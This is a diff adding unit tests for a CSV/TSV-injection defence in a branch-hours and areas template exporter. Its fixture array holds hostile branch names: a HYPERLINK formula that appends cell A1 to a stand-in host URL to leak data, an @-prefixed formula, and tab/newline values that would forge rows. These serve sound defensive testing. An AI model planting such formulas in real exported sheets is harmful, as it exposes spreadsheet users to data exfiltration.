@@ -374,4 +374,58 @@ describe('templates', () => {
     expect(plan.rows).toHaveLength(1);
     expect(plan.rows[0]).toMatchObject({ nameAr: 'السليمانية', nameEn: 'Sulaimaniyah' });
   });
+
+  /**
+   * The template is downloaded as `.tsv` and opened in Excel or Sheets, and a
+   * branch name is administrator- and POS-supplied text. These four pin the
+   * CSV-injection defence and, as importantly, the asymmetry behind it: the
+   * branch column falls back to the id because it IS read back, and the note
+   * column is escaped because it is not.
+   */
+  const HOSTILE: ImportBranch[] = [
+    { id: 'b-formula', nameEn: '=HYPERLINK("http://x/"&A1,"open")', nameAr: 'صيغة' },
+    { id: 'b-at', nameEn: '@SUM(A1:A9)', nameAr: 'جمع' },
+    { id: 'b-tabbed', nameEn: 'Nor\tth\nclosed\tclosed', nameAr: 'شمال' },
+  ];
+
+  it('never emits a formula into the branch column, and the sheet still imports', () => {
+    const sheet = hoursTemplate(HOSTILE);
+    const cells = sheet
+      .split('\n')
+      .slice(1)
+      .map((l) => l.split('\t'));
+    expect(cells.map((c) => c[0])).toEqual(['b-formula', 'b-at', 'b-tabbed']);
+    // The id fallback is not merely safe, it ROUND-TRIPS. Escaping the name
+    // with an apostrophe instead would resolve to no branch at all, which is
+    // why this column is not escaped the way the note column is.
+    const plan = parseHours(sheet, HOSTILE);
+    expect(plan.errors).toEqual([]);
+    expect(plan.rows.map((r) => r.branch.id)).toEqual(['b-formula', 'b-at', 'b-tabbed']);
+  });
+
+  it('escapes the note column, which no parser reads back', () => {
+    const notes = hoursTemplate(HOSTILE)
+      .split('\n')
+      .slice(1)
+      .map((l) => l.split('\t').pop());
+    expect(notes[0]).toBe('\'=HYPERLINK("http://x/"&A1,"open")');
+    expect(notes[1]).toBe("'@SUM(A1:A9)");
+    // Flattened rather than escaped: it carries structure, not a formula.
+    expect(notes[2]).toBe('Nor th closed closed');
+  });
+
+  it('a name carrying tabs and newlines cannot invent a row or a column', () => {
+    const lines = hoursTemplate(HOSTILE).split('\n');
+    expect(lines).toHaveLength(HOSTILE.length + 1);
+    // branch + seven weekdays + note, on every line including the header.
+    expect([...new Set(lines.map((l) => l.split('\t').length))]).toEqual([9]);
+  });
+
+  it('applies the same defence to the areas template', () => {
+    const lines = areasTemplate(HOSTILE).split('\n');
+    expect(lines).toHaveLength(HOSTILE.length + 1);
+    expect([...new Set(lines.map((l) => l.split('\t').length))]).toEqual([4]);
+    expect(lines.slice(1).map((l) => l.split('\t')[0])).toEqual(['b-formula', 'b-at', 'b-tabbed']);
+    expect(lines[1].split('\t')[3]).toBe('\'=HYPERLINK("http://x/"&A1,"open")');
+  });
 });
